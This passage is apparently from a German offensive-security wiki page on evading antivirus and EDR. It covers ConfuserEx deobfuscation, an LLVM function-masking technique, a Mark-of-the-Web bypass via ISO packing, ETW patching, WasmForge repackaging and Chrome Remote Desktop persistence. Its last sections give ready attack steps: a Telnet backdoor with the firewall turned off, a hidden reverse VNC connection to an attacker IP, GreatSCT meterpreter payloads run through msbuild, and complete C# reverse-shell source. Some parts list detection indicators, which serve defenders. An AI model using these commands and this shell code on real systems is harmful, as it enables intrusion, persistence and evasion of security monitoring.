   Nach diesem Schritt sollten normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` statt undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …) zu sehen sein.

4.  Manuelle Bereinigung – führe die resultierende Binärdatei unter dnSpy aus und suche nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um die *echte* Payload zu finden. Oft speichert die Malware sie als TLV-kodiertes Byte-Array, das innerhalb von `<Module>.byte_0` initialisiert wird.

Diese Kette stellt den Ausführungsfluss wieder her, **ohne** das bösartige Sample ausführen zu müssen – nützlich bei der Arbeit auf einer Offline-Workstation.

> 🛈  ConfuserEx erstellt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-Obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/)-Compiler-Suite bereitzustellen, der durch [Code-Obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationsschutz für erhöhte Softwaresicherheit sorgt.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator zeigt, wie sich mit der Sprache `C++11/14` zur Compile-Zeit obfuszierter Code erzeugen lässt, ohne externe Tools zu verwenden oder den Compiler zu ändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Ebene obfuskierter Operationen hinzu, die vom C++-Template-Metaprogrammierungsframework generiert werden und es der Person, die die Anwendung knacken möchte, etwas schwerer machen.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binary-Obfuscator, der verschiedene PE-Dateien obfuskieren kann, darunter .exe, .dll und .sys.
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache Engine für metamorphischen Code für beliebige ausführbare Dateien.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein Framework zur feingranularen Code-Obfuscation für von LLVM unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuskiert ein Programm auf Assembly-Code-Ebene, indem reguläre Instruktionen in ROP-Ketten umgewandelt werden. Dadurch wird unsere natürliche Vorstellung eines normalen Kontrollflusses untergraben.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein in Nim geschriebener .NET-PE-Crypter.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL-Dateien in Shellcode umwandeln und anschließend laden.

### LLVM-Compiler-gestütztes Self-Masking einzelner Funktionen

Anstatt ein ganzes Implant nur im Ruhezustand zu maskieren, kann ein modifiziertes LLVM-X86-Backend ausgewählte Funktionen XOR-maskiert halten, solange sie inaktiv sind. Der Function-Peekaboo-PoC wählt demangelte Namen aus, die `REG_` enthalten, fügt positionsunabhängige Eintritts- und Austritts-Stubs um den fertigen Maschinencode ein und gibt einen gemeinsamen Maskierungs-Handler in `.text` aus; Signaturen auf Quelltextebene und die Windows-x64-Aufrufkonvention bleiben unverändert.<sup>[[38]](#references)[[39]](#references)</sup>

#### Kontrollfluss-Transformation im Backend

Die Transformation sollte nach der Instruktionsauswahl und Optimierung erfolgen, da sie **jeden ausgegebenen Return** erfassen und das genaue x86-Layout kennen muss. Ein `MachineFunctionPass` vor der Ausgabe findet das letzte `MachineInstr::isReturn()`, löscht es, sodass der letzte Pfad in den angehängten Epilog fällt, und ersetzt frühere Returns durch `JMP_1 handler`. Erhalte alle vom Compiler erzeugten Stack-/Frame-Abbauinstruktionen vor jedem Return; leite nur die Return-Instruktion selbst um.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` und `emitFunctionBodyEnd()` geben die funktionsspezifischen Stubs aus, während `emitEndOfAsmFile()` den Handler ausgibt. Symbole, die von mehreren Ausgabephasen gemeinsam verwendet werden, ermöglichen es einem Prolog-Branch, auf seinen später ausgegebenen Epilog zu verweisen. Für ein manuell ausgegebenes Near-`je` schreibe `0F 84`, gefolgt vom vier Byte großen MC-Ausdruck `target - address_after_je`. Aufrufe und Sprünge zum Handler können stattdessen als `MCInst`-Objekte ausgegeben werden (`CALL64pcrel32` und `JMP_1`). Ein Pass muss für eine nicht ausgewählte Funktion `false` zurückgeben, wenn er nichts geändert hat; der PoC gibt in diesem Fall fälschlicherweise `true` zurück.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadaten und Initialisierung vor dem CRT

Der PoC legt einen XOR-Schlüssel und 16-Byte-Datensätze mit einem vom Loader relocierten Funktionszeiger und einer Laufzeitlänge in `.funcmeta` ab. Obwohl das C-Feld ein `uint32_t` ist, greift der Handler an Datensatz-Offset `+8` auf ein QWORD zu und liest dabei die Länge samt Padding. Die Datensätze werden jeweils um `0x10` weitergeschaltet. PE-Sektionsnamen sind auf acht Bytes begrenzt, weshalb die Laufzeitabfrage `.funcmet` sieht. Ein externer Patcher fügt ein ausführbares `.stub` hinzu, speichert die alte Entry-Point-RVA im Stub und leitet `AddressOfEntryPoint` um. Der PIC-Stub ruft die Image Base über `gs:[0x60]` → `[PEB+0x10]` ab, durchläuft die PE32+-Imports, um ein bereits importiertes `VirtualProtect` aufzulösen, und wird vor dem CRT ausgeführt.<sup>[[38]](#references)[[39]](#references)</sup>

Bei der Initialisierung wird ein Sentinel in `gs:[0xE8]` gesetzt und jede Metadatenfunktion aufgerufen. Der dauerhaft lesbare Prolog speichert den Funktionsanfang in `gs:[0xF0]`, erkennt den Sentinel und überspringt den noch unverschlüsselten Funktionskörper. Der Epilog verwendet anschließend `call handler`; nachdem der Handler 13 Register (`0x68` Bytes) gesichert hat, enthält die Rücksprungadresse bei `[rsp+0x68]` das Ende der transformierten Funktion. Damit lässt sich `end - start` berechnen und in den Metadatensatz schreiben. Nachdem alle Funktionskörper maskiert wurden, löscht der Stub den Sentinel und springt zu `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Bei einem normalen Aufruf ruft der Prolog denselben symmetrischen Handler auf, um den Funktionskörper zu entschlüsseln. Der letzte Pfad fällt in den angehängten Epilog, während jeder frühere Return direkt zum gemeinsamen Handler springt. Auch der normale Epilog verwendet `jmp handler` statt `call`. Nach dem erneuten Maskieren übernimmt daher der `ret` des Handlers die ursprüngliche Rücksprungadresse des Aufrufers und erhält das Funktionsergebnis in `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Maskierungsprimitive und Analyseindikatoren

Der Handler sucht den aktuellen Datensatz, überspringt den festen, sichtbaren Prolog (in diesem Build `0x46` Bytes), setzt den restlichen Bereich auf `PAGE_EXECUTE_READWRITE`, XORt ihn Byte für Byte mit dem niederwertigen Schlüssel-Byte und setzt ihn anschließend auf `PAGE_EXECUTE_READ`. Dieselbe Schleife entschlüsselt den Funktionskörper beim Eintritt und verschlüsselt ihn bei jedem normalen Austritt erneut.<sup>[[38]](#references)[[39]](#references)</sup>

Starke Indikatoren für dieses Design sind:<sup>[[38]](#references)[[39]](#references)</sup>

- ein Entry Point innerhalb eines ausführbaren `.stub` sowie eine `.funcmet`-Sektion mit einem Schlüssel und relocierten Zeigern auf `.text`;
- PEB-, Import-Tabellen- und Sektionstabellen-Parsing vor dem CRT, gefolgt von Aufrufen über jeden Metadatenzeiger;
- identische PIC-Prologe mit `call`/`pop` und zahlreiche Return-Stellen, die zu einem Handler umgeleitet werden;
- Schreibzugriffe auf `gs:[0xE8]`, `gs:[0xF0]` und `gs:[0xF8]`, gefolgt von wiederholten `VirtualProtect`-Übergängen und byteweisen XOR-Schreibzugriffen in ausführbare, vom Image belegte Speicherseiten.

Dies ist eine Umgehung von Memory-Scannern, kein kryptografischer Schutz: Die gepatchte Datei enthält weiterhin den ursprünglichen, unverschlüsselten Funktionskörper, und ein Debugger kann bei `VirtualProtect` oder der XOR-Schleife anhalten und die aktive Funktion auslesen. Das Ein-Byte-XOR, die lesbaren Metadaten und die feste Grenze von `0x46` machen auch eine Offline-Wiederherstellung unkompliziert.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Die TEB-Slots des PoC sind threadspezifisch, die modifizierten Code-Seiten jedoch prozessweit. Bei gleichzeitigem oder rekursivem Eintritt können Instruktionen daher erneut umgeschaltet werden, während ein anderer Aufruf sie gerade ausführt. Auch Ausnahmen und nichtlokale Exits können das erneute Maskieren umgehen. Eine robuste Implementierung muss Übergänge synchronisieren, den tatsächlich über `lpflOldProtect` zurückgegebenen Seitenschutz wiederherstellen, fest codierte Stub-Längen vermeiden, sowohl `call`- als auch `jmp`-Pfade auf die x64-Stack-Ausrichtung prüfen und nach dem Umschreiben ausführbarer Bytes `FlushInstructionCache` aufrufen. Microsoft weist ausdrücklich darauf hin, dass der Aufrufer für die Kohärenz des Instruktions-Caches verantwortlich ist, wenn ausführbarer Code geändert wird.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Vielleicht ist dir dieser Bildschirm schon einmal begegnet, wenn du ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt hast.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der Endbenutzer davor schützen soll, potenziell schädliche Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich reputationsbasiert. Das bedeutet, dass selten heruntergeladene Anwendungen SmartScreen auslösen und so den Endbenutzer warnen und daran hindern, die Datei auszuführen (die Datei lässt sich jedoch weiterhin über More Info -> Run anyway ausführen).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch erstellt wird und die URL enthält, von der die Datei heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Den Zone.Identifier ADS einer aus dem Internet heruntergeladenen Datei überprüfen.</p></figcaption></figure>

> [!TIP]
> Wichtig ist, dass ausführbare Dateien mit einem **vertrauenswürdigen** Signaturzertifikat **SmartScreen nicht auslösen**.

Eine sehr effektive Methode, um zu verhindern, dass deine Payloads den Mark of The Web erhalten, besteht darin, sie in einen Container wie eine ISO zu verpacken. Der Grund dafür ist, dass Mark-of-the-Web (MOTW) **nicht** auf **Nicht-NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabe-Container verpackt, um Mark-of-the-Web zu umgehen.

Beispielverwendung:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads mit [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) in ISO-Dateien verpackt werden.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsstarker Logging-Mechanismus in Windows, mit dem Anwendungen und Systemkomponenten **Ereignisse protokollieren** können. Sicherheitsprodukte können ihn jedoch auch verwenden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie sich AMSI deaktivieren (umgehen) lässt, ist es auch möglich, die Funktion **`EtwEventWrite`** des User-Space-Prozesses so zu ändern, dass sie sofort zurückkehrt, ohne Ereignisse zu protokollieren. Dazu wird die Funktion im Speicher gepatcht, sodass sie sofort zurückkehrt und damit das ETW-Logging für diesen Prozess effektiv deaktiviert.

Weitere Informationen findest du unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) und [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C#-Binaries im Speicher zu laden, ist schon seit geraumer Zeit bekannt und weiterhin eine sehr gute Möglichkeit, deine Post-Exploitation-Tools auszuführen, ohne von AV entdeckt zu werden.

Da die Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen. Dafür gibt es jedoch verschiedene Methoden:

- **Fork\&Run**

Dabei wird **ein neuer sacrificial process gestartet**, der bösartigen Post-Exploitation-Code injiziert und ausführt. Anschließend wird der neue Prozess beendet. Diese Methode hat sowohl Vorteile als auch Nachteile. Der Vorteil von Fork and Run ist, dass die Ausführung **außerhalb** unseres Beacon-Implant-Prozesses stattfindet. Wenn also bei unserer Post-Exploitation-Aktion etwas schiefläuft oder entdeckt wird, ist die **Chance deutlich größer**, dass unser **Implant überlebt**. Der Nachteil ist, dass die **Chance größer ist**, von **verhaltensbasierten Erkennungen** entdeckt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der bösartige Post-Exploitation-Code **in den eigenen Prozess** injiziert. So musst du keinen neuen Prozess erstellen, der von AV gescannt werden könnte. Der Nachteil ist, dass bei einem Fehler während der Ausführung deiner Payload die **Chance deutlich größer ist**, deinen **Beacon zu verlieren**, da der Prozess abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies erfahren möchtest, lies diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und schau dir den InlineExecute-Assembly BOF an ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)).

Du kannst C#-Assemblies auch **aus PowerShell** laden. Sieh dir [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und das [Video von S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## NativeAOT-WebAssembly-Neuverpackung von .NET-Tools (WasmForge)

Bei normalen `execute-assembly`-Techniken bleibt erkennbares MSIL erhalten, und schließlich wird eine CLR initialisiert. **WasmForge** ändert stattdessen die Ausführungsgrundlage: Es migriert ein C#-Projekt auf das experimentelle NativeAOT-LLVM-WASI-Ziel, kompiliert es vorab zu WebAssembly und bettet das Modul in einen Windows-PE-Host auf Basis von Wazero ein. Der resultierende Prozess benötigt weder die CLR, den JIT noch den `dotnet`-Host des Ziels. Regeln, die ausschließlich auf verwalteten Assembly-Namen, dem Laden der CLR, AMSI oder .NET ETW basieren, erhalten daher keinen direkten Einblick mehr. Dies ist eine Umgehungs-/Verpackungstechnik und keine Umgehung einer Privilegiengrenze – der Gast behält die Berechtigungen und das beobachtbare OS-Verhalten des ursprünglichen Tools bei.<sup>[[44]](#references)[[45]](#references)</sup>

### Ein C#-Projekt erstellen

Der empfohlene Build-Pfad ist die Docker-Umgebung des Projekts, da sie das .NET 10 SDK, den NativeAOT-LLVM-Workload, das WASI SDK 24.0, den Linker und die Abhängigkeiten zum Signieren enthält. Eine `.csproj`-Datei wird automatisch erkannt; der Build in einem Schritt führt Migration, Kompatibilitätspatches, WASM-Kompilierung, PE-Erstellung und Signierung aus.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Zur Fehlerbehebung oder Überprüfung des generierten Codes lässt sich der Prozess in `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` und abschließend `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` aufteilen. Das Build-Image verwendet außerdem einen `wasm-component-ld`-Wrapper, um die WASI-Preview-2-Komponentenkodierung zu vermeiden und das einfache Modul zu erzeugen, das die eingebettete Runtime erwartet.<sup>[[44]](#references)[[45]](#references)</sup>

### Brücke von wasm32 C# zu x64 Win32

Dies ist keine transparente Neukompilierung. NativeAOT-WASI fehlen Windows-orientierte BCL-Funktionen oder sie verhalten sich anders, und ein wasm32-Gast reserviert normalerweise vier Byte große Zeigerslots, während x64-APIs acht Byte große Zeiger zurückgeben können. WasmForge begegnet beiden Problemen mit den folgenden generierten Ebenen:<sup>[[44]](#references)</sup>

1. Ein Source-Patcher behebt AOT-spezifische semantische Unterschiede und leitet nicht unterstützte Aufrufe für Registry, Pipes, WMI, Identität, Verzeichnisdienste, Dateiversionen, LSA und ähnliche Funktionen an `Wf*`-Hilfsfunktionen weiter.
2. Ein P/Invoke-Scanner erzeugt NativeAOT-`DirectPInvoke`-Zuordnungen, sodass `[DllImport]`-Aufrufe an verknüpfte C-Brückensymbole gebunden werden, anstatt die angegebene DLL im Gast dynamisch zu laden.
3. Hostgebundene Zeiger verwenden `ulong` in C# und `uint64_t` in C. Ein generischer Dispatcher leitet den Aufruf an den Win32-Handler des Hosts weiter; ein `out8_mask` kennzeichnet echte acht Byte große Ausgabeslots, deren obere Hälften erhalten bleiben müssen. Nicht markierte Ausgaben im wasm32-Format werden durch Snapshot-/Restore-Schutz gesichert, damit ein x64-Schreibvorgang nicht die angrenzenden vier Byte beschädigt.
4. Dedizierte Host-Brücken übernehmen Operationen, die nicht in die generische Syscall-Verarbeitung passen, etwa den Zugriff auf den LSA-Ticket-Cache, Kerberos-/BCrypt-Operationen mit strukturierten Ergebnissen, TCP-KDC-Datenverkehr und LDAP-Abfragen.

Ein Wrapper für `version.dll!VerQueryValueW` übergibt beispielsweise vier Hostadressen und setzt die Bits 2 und 3 (`0xC`), da der Wertzeiger und die Länge acht Byte große Ausgabeslots sind. Der Wrapper selbst bleibt generisch und übergibt DLL-Namen, Exportnamen, Argumente und Maske an `wf_call_v2`; der Host übernimmt die Zeigerübersetzung und ruft die native API auf.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Einschränkungen und Erkennungsmöglichkeiten

Code mit vielen Reflection-Aufrufen, dynamisches Laden von Assemblies, beliebige native Callbacks und komplexe x64-Strukturen, die in den WASM-Speicher zurückgegeben werden, können weiterhin Patches für einzelne Tools erfordern oder vollständig fehlschlagen. Generische WASI-Preview-2-Sockets können außerdem No-op-Stubs erreichen, daher verwenden unterstützte Tools protokollspezifische Host-Shims. Überprüfe jeden Befehl anhand eines nativen Builds, statt von Feature-Parität auszugehen.<sup>[[44]](#references)[[45]](#references)</sup>

Diese Technik verlagert die Telemetrie, statt die Payload unsichtbar zu machen. Die Erkennung kann sich auf eine PE-Datei konzentrieren, die ein WASM-Modul enthält oder materialisiert, auf ein Wazero-ähnliches Laufzeitverhalten, ungewöhnliche Speicherzuweisungen und -kopiervorgänge zwischen Host und Guest, generische direkte Win32-Dispatches, Auffälligkeiten bei Signaturen und PE-Ressourcen sowie die daraus resultierenden API-Aufrufe und den Netzwerkverkehr. Das Fehlen von CLR-Load-, AMSI- oder .NET-ETW-Ereignissen sollte daher nicht als Beleg dafür gelten, dass ein Prozess harmlos ist.<sup>[[44]](#references)</sup>

## Andere Programmiersprachen verwenden

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, lässt sich bösartiger Code mit anderen Sprachen ausführen, indem dem kompromittierten Computer Zugriff **auf die Interpreter-Umgebung gewährt wird, die auf der vom Angreifer kontrollierten SMB-Freigabe installiert ist**.

Indem du Zugriff auf die Interpreter-Binaries und die Umgebung auf der SMB-Freigabe gewährst, kannst du **beliebigen Code in diesen Sprachen im Speicher** des kompromittierten Computers ausführen.

Das Repository weist darauf hin: Defender scannt die Skripte weiterhin, aber durch die Verwendung von Go, Java, PHP usw. haben wir **mehr Flexibilität beim Umgehen statischer Signaturen**. Tests mit zufälligen, nicht verschleierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## WebAssembly-Rehosting zur Umgehung statischer Analyse

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token Stomping manipuliert das Zugriffstoken eines Sicherheitsprodukts wie einer EDR- oder AV-Lösung. Wenn die Berechtigungen des Tokens reduziert werden, kann der Prozess weiterlaufen, während er daran gehindert wird, privilegierte Prüf- oder Behebungsaktionen auszuführen.

Um dies zu verhindern, könnte Windows **externen Prozessen verbieten**, Handles für die Tokens von Sicherheitsprozessen zu erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Vertrauenswürdige Software verwenden

### Chrome Remote Desktop

Wie in [**diesem Blogbeitrag**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, lässt sich Chrome Remote Desktop einfach auf dem PC eines Opfers installieren und anschließend zur Übernahme und zur Aufrechterhaltung der Persistenz verwenden:<sup>[[35]](#references)</sup>
1. Lade das Programm von https://remotedesktop.google.com/ herunter, klicke auf „Set up via SSH“ und anschließend auf die MSI-Datei für Windows, um sie herunterzuladen.
2. Führe das Installationsprogramm auf dem Opferrechner im Hintergrund aus (Administratorrechte erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Kehre zur Chrome-Remote-Desktop-Seite zurück und klicke auf „Next“. Der Assistent fordert dich dann zur Autorisierung auf; klicke auf „Authorize“, um fortzufahren.
4. Führe den bereitgestellten Befehl mit den erforderlichen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (der Parameter `--pin` legt die PIN ohne Verwendung der GUI fest).
 

## Fortgeschrittene Umgehungstechniken

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Umgehung ist ein sehr komplexes Thema. Manchmal musst du zahlreiche verschiedene Telemetriequellen auf einem einzigen System berücksichtigen, daher ist es in ausgereiften Umgebungen praktisch unmöglich, vollständig unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dir sehr, dir diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittenere Umgehungstechniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über tiefgreifende Umgehungstechniken.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Ältere Techniken**

### **Prüfen, welche Teile Defender als bösartig erkennt**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden. Das Tool **entfernt Teile der Binary**, bis es **herausfindet, welcher Teil von Defender** als bösartig erkannt wird, und teilt ihn dir mit.\
Ein weiteres Tool, das **dasselbe macht, ist** [**avred**](https://github.com/dobin/avred), das den Dienst auch als Webangebot unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) bereitstellt.

### **Telnet-Server**

Bis Windows 10 verfügte jede Windows-Version über einen **Telnet-Server**, den du installieren konntest (als Administrator) mit:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Sorge dafür, dass es beim Systemstart **gestartet** wird, und **führe** es jetzt aus:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnet-Port ändern** (stealth) und Firewall deaktivieren:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Lade es herunter unter: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du benötigst die Binärdateien, nicht das Setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Lege unter _VNC Password_ ein Passwort fest
- Lege unter _View-Only Password_ ein Passwort fest

Verschiebe dann die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf den **Opferrechner**

#### **Reverse connection**

Der **Angreifer** sollte auf seinem **Host** die Binärdatei `vncviewer.exe -listen 5900` ausführen, damit sie bereit ist, eine umgekehrte **VNC-Verbindung** entgegenzunehmen. Führe dann auf dem **Opferrechner** den winvnc-Daemon mit `winvnc.exe -run` aus und anschließend `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNUNG:** Um unauffällig zu bleiben, darfst du Folgendes nicht tun:

- Starte `winvnc` nicht, wenn es bereits läuft, da dadurch ein [Popup](https://i.imgur.com/1SROTTl.png) ausgelöst wird. Prüfe mit `tasklist | findstr winvnc`, ob es läuft.
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, da sonst [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png) geöffnet wird.
- Führe nicht `winvnc -h` aus, um Hilfe aufzurufen, da dadurch ein [Popup](https://i.imgur.com/oc18wcu.png) ausgelöst wird.

### GreatSCT

Lade es herunter unter: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

In GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Starte nun den **Listener** mit `msfconsole -r file.rc` und **führe** den **xml payload** aus mit:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Der aktuelle Defender beendet den Prozess sehr schnell.**

### Kompilieren unserer eigenen Reverse Shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C#-Revershell

Kompiliere sie mit:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Verwende es mit:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# mit einem Compiler verwenden

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

